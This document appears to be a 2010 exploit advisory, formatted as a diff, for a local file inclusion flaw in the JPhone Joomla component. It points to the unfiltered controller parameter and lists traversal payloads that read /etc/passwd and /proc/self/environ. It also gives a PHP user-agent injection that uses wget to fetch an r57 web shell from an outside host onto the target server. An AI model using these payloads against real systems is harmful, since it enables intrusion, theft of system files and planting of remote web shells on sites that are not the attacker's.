@@ -1,0 +1,77 @@
+?
+JPhone 1.0 Alpha 3 Component Joomla Local File Inclusion
+=========================================================================================
+
+- Discovered by	: Chip D3 Bi0s
+- Email         : chipdebios[at]gmail[dot]com
+- Group         : LatinHackTeam
+- Date          : 2010-09-10
+- Where         : From Remote
+
+-------------------------------------------------------------------------------------
+Affected software description
+
+Application     : Jphone
+Developer       : Urs Kobald
+Compatibility   : 1.0 Alpha 3
+License         : GPLv2 or later
+Date Added      : 14 Aug 2010
+website         : http://www.4you-studio.com
+Download        : http://www.joomlafrance.org/telecharger/download/Jphone/344bbad81cf491b6e5215e3f15fc3fb7.html
+
+I. BACKGROUND
+
+Called Jphone, component agency 4you studio allows for your Joomla adapted mobile
+version with a real interface using page transition effects rather pro
+(the cube effect and popup are very nice).
+
+Consisting of a component and a plugin for Joomla, it is after activating the plugin
+define a menu (the menu management of Joomla). This is to link the specific component
+to display your content. Currently seen by the articles, categories, sections are set
+but also those contacts and links Web (Two native Joomla components).
+The installation procedure is shown in the download package.
+
+In addition, the proposed version is an alpha version 
+(therefore usable only for testing purposes) but resulted entirely in French.
+Feel free to share your opinion on the forum.
+Support for Android and PalmPre should be functional (not tested)
+
+II. DESCRIPTION
+
+Some Local File inclusion vulnerabilities exist in Component Joomla Jphone 1.0 Alpha 3.
+
+
+
+III. ANALYSIS
+
+The bug is in the following files, specifying the lines
+
+/components/com_jphone/jphone.php
+
+
+
+[63] if($controller = JRequest::getVar('controller')) {
+[64]
+[65]	require_once (JPATH_COMPONENT.DS.'controllers'.DS.$controller.'.php');
+
+ Explanation:As noted in the line [65] $controller
+ nowhere is filtered, which result is lfi as is known to pass '.php' use %00 :)
+
+
+IV. EXPLOITATION
+
+http://site/path/index.php?option=com_jphone&controller={LFI}
+{LFI}=../../../../../../../../../../etc/passwd%00
+{LFI}=../../../../../../../../../../proc/self/environ%00
+
+changing the user agent for something so:
+<?system('wget http://chipdebios.com/r57.txt -O r57.php');?>
+
+A special greeting to my good friends:
+F3l0m4n, R4y0k3nt, ecore, J3h3s, r0i & pc Marquesita :)
+
+
+
++++++++++++++++++++++++++++++++++++++++
+[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
